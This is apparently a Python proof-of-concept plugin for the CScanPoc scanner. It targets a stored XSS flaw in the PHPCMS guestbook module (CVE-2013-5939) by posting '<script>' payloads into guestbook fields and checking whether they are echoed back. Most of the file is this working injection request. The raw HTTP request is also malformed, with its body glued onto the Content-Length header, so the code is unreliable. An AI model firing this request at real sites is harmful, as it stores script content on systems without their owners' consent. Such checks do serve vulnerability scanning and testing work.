# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0029'  # 平台漏洞编号，留空
    name = 'PHPCMS guestbook module Stored XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2013-10-23'  # 漏洞公布时间
    desc = '''
        PHPCMS采用PHP5+MYSQL做为技术基础进行开发。9采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。 5年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达10万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。
        The phpcms has be found the Stored XSS Vulnerability if use the guestbook module.
        someone can insert xss code at the front guestbook,when admin view this message in the admin control panel,
        the xss code has be implemented.
    '''  # 漏洞描述
    ref = 'http://cve.scap.org.cn/CVE-2013-5939.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2013-5939'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS 1.2.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec0adea6-54fe-4060-a741-8968c1fcc96c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            o = urllib.parse.urlparse(self.target)
            host = o.hostname
            raw = '''
POST /index.php?m=guestbook&c=index&a=register&siteid=1 HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=40360ct0tfshplcik807r9phr4;
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length:317typeid=54&codes=&title=[<script>alert(c)</script>]&introduce=[<script>alert(c)</script>]&department=&area=&name=&tel=&email=&isbbs=on&code=dmsc&dosubmit=
            '''.format(host=host)
            hh = hackhttp.hackhttp()
            code, head, res, errcode, _ = hh.http(self.target, raw=raw)
            if '<script>alert(c)</script>' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
